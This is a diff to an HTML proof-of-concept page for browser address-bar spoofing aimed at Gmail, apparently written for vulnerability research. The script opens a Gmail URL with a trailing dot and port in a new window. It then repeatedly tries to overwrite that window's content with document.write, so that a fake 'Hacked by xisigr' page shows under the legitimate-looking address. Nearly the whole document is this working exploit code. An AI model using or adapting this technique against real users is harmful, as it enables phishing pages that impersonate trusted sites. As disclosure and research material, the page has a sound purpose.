@@ -1,40 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Spoof Testcase - Click Version</title>
+  <title>PoC: Address Bar Spoofing & UI Redressing</title>
 </head>
 <body>
 
-  <h3>
-    <a href="javascript:void(0)" id="a" onclick="executeSpoof()">
-      <h1>Click Me</h1>
-    </a>
-  </h3>
-  
-  <div id="note" style="display:none;">
+  <div id="setup">
+    <h3>Vulnerability Research: Address Bar Spoofing</h3>
+    <p>Target: Gmail/Google</p>
+    <button onclick="startExploit()" style="padding: 10px 20px; font-size: 18px; cursor: pointer;">
+      <h1>Click Me to Test</h1>
+    </button>
+  </div>
+
+  <div id="note" style="display:none; text-align: center;">
     <img src="https://i.ibb.co.com/xS0bMW7S/image.png" alt="Obito Scene" style="max-width: 500px; height: auto;">
     <br>
-    <h1>I Am Not Google At All</h1>
+    <h2 style="color: red;">[EXPLOIT SUCCESSFUL]</h2>
+    <h3>I Am Not Google At All - Current Page Content Spoofed</h3>
   </div>
 
 <script>
-  function executeSpoof() {
-    
-    var t = window.open('https://www.google.com:443.', 'spoof_window');
+  function startExploit() {
+
+    var targetURL = "https://www.gmail.com:443."; 
+    var windowName = "spoof_tab";
 
     
-    setTimeout(function() {
-        try {
-            t.document.title = "Google";
-            t.document.body.innerHTML = "<h1>Fake Page - Vulnerability Research</h1>";
-        } catch(e) {
-            console.log("Cross-origin blocked, but spoof window opened.");
+    var victimWindow = window.open(targetURL, windowName);
+
+    var attackInterval = setInterval(function() {
+      try {
+        if (victimWindow) {
+          victimWindow.document.write(`
+            <html>
+              <head><title>Gmail</title></head>
+              <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
+                <h1 style="color:red;">Hacked by xisigr</h1>
+                <p>This is a fake page content on a legitimate-looking URL.</p>
+                <hr>
+                <p>If you see this and the URL is still Gmail, it's a SPOOF.</p>
+              </body>
+            </html>
+          `);
+       
+          clearInterval(attackInterval);
         }
-    }, 100);
+      } catch (e) {
+       
+        console.log("Waiting for injection window...");
+      }
+    }, 10);
 
-    document.title = 'Done';
-    document.getElementById('a').style.display = 'none';
+  
+    setTimeout(() => clearInterval(attackInterval), 2000);
+
+    
+    document.getElementById('setup').style.display = 'none';
     document.getElementById('note').style.display = 'block';
+    document.title = "Done - Exploit Triggered";
   }
 </script>
 
